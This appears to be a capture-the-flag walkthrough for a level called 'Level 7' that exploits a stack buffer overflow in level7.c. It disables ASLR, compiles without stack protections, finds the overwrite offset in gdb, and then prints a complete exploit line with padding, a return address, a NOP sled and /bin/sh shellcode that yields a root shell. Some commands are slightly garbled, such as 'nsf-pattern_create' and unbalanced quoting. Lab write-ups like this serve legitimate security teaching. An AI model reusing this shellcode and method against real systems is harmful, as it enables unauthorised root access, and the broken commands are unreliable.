Level 7
#
In this level we will exploit a buffer overflow: The buffer overflow is an attack that occurs when a program written in the C language exceeds the limits of a buffer, which can allow an attacker to overwrite memory and execute malicious code. To perform a buffer overflow on C code under Linux, you can use commands such as "gcc" to compile the source code into machine language, "gdb" to debug the program and identify potential vulnerabilities, and tools like "Valgrind" to detect memory leaks and memory management errors.
#
cd ..
cd 07_tropical_fruits
ls -al
cat level7.c
We will start by disabling some protections (the "aslr")

cat /proc/sys/kernel/randomize_va_space

"the variable is set to 2"

echo 0 > /proc/sys/kernel/randomize_va_space 
(to disable the ASLR protection)
Now we need to compile our program:

gcc -z execstack -fno-stack-protector -m32 level7.c -o level7~

-z execstack: makes the stack executable, allowing us to execute instruction sets in memory, which will allow us to execute our shell code in memory
-fno-stack-protector: this option allows us to bypass certain protections like canary, this cancels the protection on the "buffer" variable that we will exploit
-m32: for 32-bit
-o: for output

gdb: is a Linux debugger

gdb level7

nsf-pattern_create -l

nsf-pattern_offset -q 0Ab1

we execute these lines to determine the size of our offset, the location where we should introduce the shell code
run $(python -c "print 'A'* 312)

info frame

print $esp

./level7 $(python -c print 'A'*312 + '\x10\xd2\xff\xff'+ '\x90'*30 + '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80' " )

we are now in root mode
and therefore access the file in which the solution is located
#




